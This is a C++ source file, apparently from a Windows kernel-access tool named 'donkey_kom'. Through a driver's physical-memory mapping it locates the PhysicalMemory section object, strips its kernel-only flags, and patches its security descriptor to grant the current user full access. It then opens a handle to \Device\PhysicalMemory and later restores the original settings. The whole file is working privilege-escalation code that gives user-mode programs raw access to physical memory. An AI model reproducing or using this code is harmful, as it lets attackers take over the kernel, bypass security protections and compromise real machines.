#include "donkey_kom.hpp"
#include "donkey_kom_internal.hpp"

namespace dk {
	void initialize() {
		memory_manager memory;
		driver_manager driver;

		driver.open_driver();

		memory.populate_ranges();

		auto last_mapped = driver.map_memory(0, 0x2000);

		auto page_cb = [&](uint64_t addr, uint8_t *&cursor) -> bool {
			driver.unmap_memory(last_mapped, 0x2000);
			last_mapped = cursor = driver.map_memory(addr, 0x2000);
			return true;
		};

		auto block_cb = [](uint64_t addr, uint8_t *&cursor) -> bool {
			auto obj_header = reinterpret_cast<POBJECT_HEADER>(cursor + 0x30);

			if (obj_header->HandleCount >= 0 && obj_header->HandleCount <= 3 && obj_header->Flags == 0x16) {
				return false;
			}

			return true;
		};

		auto phys_mem_obj = memory.scan_ranges("Sect", page_cb, block_cb);
		if (!phys_mem_obj) {
			throw std::runtime_error("Unable to find PhysicalMemory");
		}

		auto obj_header = reinterpret_cast<POBJECT_HEADER>(phys_mem_obj + 0x30);
		obj_header->KernelObject = 0;
		obj_header->KernelOnlyAccess = 0;

		try {
			PACL previous_dacl = nullptr;
			previous_dacl = patch_phys_mem_security_descriptor();
			if (previous_dacl == nullptr) {
				throw std::runtime_error("Unable to change physical memory security descriptor");
			}

			auto physical_mem_handle = open_physical_mem();
			if (!physical_mem_handle) {
				throw std::runtime_error("Unable to open a handle to physical memory");
			}

			system("pause");

			if (!unpatch_phys_mem_security_descriptor(previous_dacl)) {
				throw std::runtime_error("Unable to restore security descriptor");
			}
		}
		catch (std::exception ex) {
			obj_header->KernelObject = 1;
			obj_header->KernelOnlyAccess = 1;

			throw ex;
		}

		obj_header->KernelObject = 1;
		obj_header->KernelOnlyAccess = 1;

		driver.unmap_memory(last_mapped, 0x2000);
	}

	HANDLE open_physical_mem(ACCESS_MASK access) {
		UNICODE_STRING device_name;
		RtlInitUnicodeString(&device_name, L"\\device\\physicalmemory");

		OBJECT_ATTRIBUTES attribs;
		InitializeObjectAttributes(&attribs, &device_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

		HANDLE handle;
		auto status = ZwOpenSection(&handle, access, &attribs);
		if (!NT_SUCCESS(status)) {
			return NULL;
		}

		return handle;
	}

	PACL patch_phys_mem_security_descriptor() {
		auto handle = open_physical_mem(WRITE_DAC | READ_CONTROL);
		if (!handle) {
			return nullptr;
		}

		PACL previous_dacl = NULL;
		if (GetSecurityInfo(handle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &previous_dacl, NULL, 0) != ERROR_SUCCESS) {
			return nullptr;
		}

		PACL dacl = NULL;
		EXPLICIT_ACCESS	access_entry = { SECTION_ALL_ACCESS, GRANT_ACCESS, NO_INHERITANCE,
			{ NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_NAME, TRUSTEE_IS_USER, "CURRENT_USER" } };

		if (SetEntriesInAcl(1, &access_entry, previous_dacl, &dacl) != ERROR_SUCCESS) {
			return nullptr;
		}

		if (SetSecurityInfo(handle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, dacl, NULL) != ERROR_SUCCESS) {
			return nullptr;
		}

		CloseHandle(handle);

		return previous_dacl;
	};

	BOOLEAN unpatch_phys_mem_security_descriptor(PACL previous_dacl) {
		auto handle = open_physical_mem(WRITE_DAC | READ_CONTROL);
		if (!handle) {
			return false;
		}

		if (SetSecurityInfo(handle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, previous_dacl, NULL) != ERROR_SUCCESS) {
			return false;
		}

		CloseHandle(handle);

		return true;
	}
}
